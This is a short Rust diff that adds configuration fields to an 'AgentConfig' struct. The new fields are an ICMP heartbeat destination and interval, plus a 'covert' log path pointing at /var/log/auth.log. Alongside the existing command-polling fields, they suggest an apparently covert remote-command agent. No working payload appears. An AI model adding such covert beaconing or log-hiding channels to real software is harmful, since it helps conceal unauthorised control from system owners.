@@ -186,7 +186,20 @@ pub struct AgentConfig {
     pub use_api: bool,
     #[serde(default)]
     pub last_command_hash: String,
+    #[serde(default = "default_icmp_dest")]
+    pub icmp_heartbeat_dest: String,
+    #[serde(default = "default_icmp_interval")]
+    pub icmp_heartbeat_interval: u64,
+    #[serde(default = "default_log_covert_path")]
+    pub log_covert_path: String,
+    #[serde(default = "default_log_covert_interval")]
+    pub log_covert_interval: u64,
 }
+
+fn default_icmp_dest() -> String { "8.8.8.8".into() }
+fn default_icmp_interval() -> u64 { 300 }
+fn default_log_covert_path() -> String { "/var/log/auth.log".into() }
+fn default_log_covert_interval() -> u64 { 600 }
 
 fn default_poll_interval() -> u64 {
     60
@@ -243,6 +256,10 @@ impl Default for AgentConfig {
             max_fails_before_skip: 5,
             use_api: false,
             last_command_hash: String::new(),
+            icmp_heartbeat_dest: default_icmp_dest(),
+            icmp_heartbeat_interval: default_icmp_interval(),
+            log_covert_path: default_log_covert_path(),
+            log_covert_interval: default_log_covert_interval(),
         }
     }
 }
